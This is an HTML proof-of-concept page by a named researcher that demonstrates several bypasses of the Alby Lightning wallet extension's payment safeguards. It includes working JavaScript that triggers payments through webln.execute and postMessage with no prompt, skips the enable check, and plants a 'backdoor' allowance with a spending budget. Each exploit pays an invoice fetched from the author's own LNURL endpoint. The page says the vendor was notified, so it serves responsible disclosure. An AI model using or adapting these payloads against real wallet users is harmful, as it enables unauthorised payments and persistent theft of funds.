<!doctype html>
<html>
  <head>
    <link rel="stylesheet" href="https://unpkg.com/@picocss/pico@latest/css/pico.min.css">
    <link rel="icon" href="/favicon.png">
    <title>Alby security PoC</title>
    <style>
      button {
        width: 93%;
        display: inline;
        margin-right: 1.3rem;
      }

      .display {
        display: initial !important;
      }
    </style>
    <script>
      async function getInvoice(amount) {
        const zbdData = await fetch(`https://getalby.com/lnurlp/aaron/callback?amount=${amount}&comment=Alby%20Vulnerability%20PoC`);
        return (await zbdData.json()).pr;
      }

      async function sendUsingWebLnExec() {
        await window.webln.execute("sendPayment", {
          paymentRequest: await getInvoice(1000),
        });
      }

      async function sendUsingPostMsg170() {
        window.postMessage(
          {
            application: "LBE",
            prompt: true,
            type: "sendPayment",
            args: {
              paymentRequest: await getInvoice(1000),
            },
          },
          "*"
        );
      }

      async function sendUsingPostMsg180() {
        window.postMessage(
          {
            application: "LBE",
            prompt: true,
            action: "sendPayment",
            type: "sendPaymentOrPrompt",
            args: {
              paymentRequest: await getInvoice(1000),
            },
          },
          "*"
        );
      }

      async function bypassEnableSend() {
        window.webln.enabled = true;
        await window.webln.sendPayment(await getInvoice(1000));
      }

      async function setupBackdoor() {
        // Add if non-existent
        window.postMessage(
          {
            application: "LBE",
            prompt: true,
            action: "addAllowance",
            type: "sendPaymentOrPrompt",
            args: {
              totalBudget: 100,
              host: "aarondewes.github.io",
              name: "Backdoor by Aaron's PoC",
              imageURL: "https://github.com/getAlby/website/blob/main/public/images/alby_icon_head_icon.png?raw=true",
              paymentRequest: await getInvoice(1000),
            },
          },
          "*"
        );
        // Otherwise update
        window.postMessage(
          {
            application: "LBE",
            prompt: true,
            action: "updateAllowance",
            type: "sendPaymentOrPrompt",
            args: {
              totalBudget: 100,
              enabled: true,
              paymentRequest: await getInvoice(1000),
            },
          },
          "*"
        );
      }
    </script>
  </head>

  <body>
    <main class="container">
      <h1>üêù Alby vulnerabilities PoC</h1>
      <p>
        This page demonstrates a few ways to bypass <a href="https://getalby.com">Alby</a>'s security features.
        The Alby team is informed and these issues will be fixed soon or have already been fixed.
        Currently, there is no direct confirmation if a payment failed or worked on this page, so be careful not to send
        me all your sats.
      </p>
      <section class="container">
        <hgroup>
          <h3>Vulnerabilities in Alby 1.7.0 and below</h2>
            <h4>These do nothing in recent versions
          </h3>
        </hgroup>
        <div class="button-group">
          <button onclick="sendUsingWebLnExec();">Send using webln.execute()</button>
          <a href="#" role="button" class="outline" style="display: inline;" onclick="document.getElementById('code1').classList.toggle('display');return false;">i</a>
          <pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;display:hidden;" id="code1">
async function sendUsingWebLnExec() {
  await window.webln.execute("sendPayment", {
    paymentRequest: await getInvoice(1000),
  });
}</pre>
          <button onclick="sendUsingPostMsg170();">Send using window.postMessage()</button>
          <a href="#" role="button" class="outline" style="display: inline;" onclick="document.getElementById('code2').classList.toggle('display');return false;">i</a>
          <pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;display:hidden;" id="code2">
async function sendUsingPostMsg170() {
  window.postMessage(
    {
      application: "LBE",
      prompt: true,
      type: "sendPayment",
      args: {
        paymentRequest: await getInvoice(1000),
      },
    },
    "*"
  );
}</pre>
        </div>
      </section>
      <section class="container">
        <hgroup>
          <h3>Vulnerabilities in Alby 1.8.0 and below</h2>
            <h4>These should create a simple payment dialog in recent versions or do nothing, depending on how much will
              be fixed.
          </h3>
        </hgroup>
        <div class="button-group">
          <button onclick="sendUsingPostMsg180();">Send using window.postMessage() and bypassing security check</button>
          <a href="#" role="button" class="outline" style="display: inline;" onclick="document.getElementById('code3').classList.toggle('display');return false;">i</a>
  <pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;display:hidden;" id="code3">
async function sendUsingPostMsg180() {
  window.postMessage(
    {
      application: "LBE",
      prompt: true,
      action: "sendPayment",
      type: "sendPaymentOrPrompt",
      args: {
        paymentRequest: await getInvoice(1000),
      },
    },
    "*"
  );
}</pre>
          <button onclick="bypassEnableSend();">Ask for payment without calling webLn.enable</button>
          <a href="#" role="button" class="outline" style="display: inline;" onclick="document.getElementById('code4').classList.toggle('display');return false;">i</a>
<pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;display:hidden;" id="code4">
async function bypassEnableSend() {
  window.webln.enabled = true;
  await window.webln.sendPayment(await getInvoice(1000));
}</pre>
          <button onclick="setupBackdoor();">Place a "backdoor" allowance</button>
          <a href="#" role="button" class="outline" style="display: inline;" onclick="document.getElementById('code5').classList.toggle('display');return false;">i</a>
<pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;display:hidden;" id="code5">
async function setupBackdoor() {
  // Add if non-existent
  window.postMessage(
    {
      application: "LBE",
      prompt: true,
      action: "addAllowance",
      type: "sendPaymentOrPrompt",
      args: {
        totalBudget: 100,
        host: "aarondewes.github.io",
        name: "Backdoor by Aaron's PoC",
        imageURL: "https://github.com/getAlby/website/blob/main/public/images/alby_icon_head_icon.png?raw=true",
        paymentRequest: await getInvoice(1000),
      },
    },
    "*"
  );
  // Otherwise update
  window.postMessage(
    {
      application: "LBE",
      prompt: true,
      action: "updateAllowance",
      type: "sendPaymentOrPrompt",
      args: {
        totalBudget: 100,
        enabled: true,
        paymentRequest: await getInvoice(1000),
      },
    },
    "*"
  );
}</pre>
        </div>
      </section>
    </main>
    <footer class="container">
      Developed by <a href="https://twitter.com/AaronDewes">@AaronDewes</a>
    </footer>
  </body>
</html>
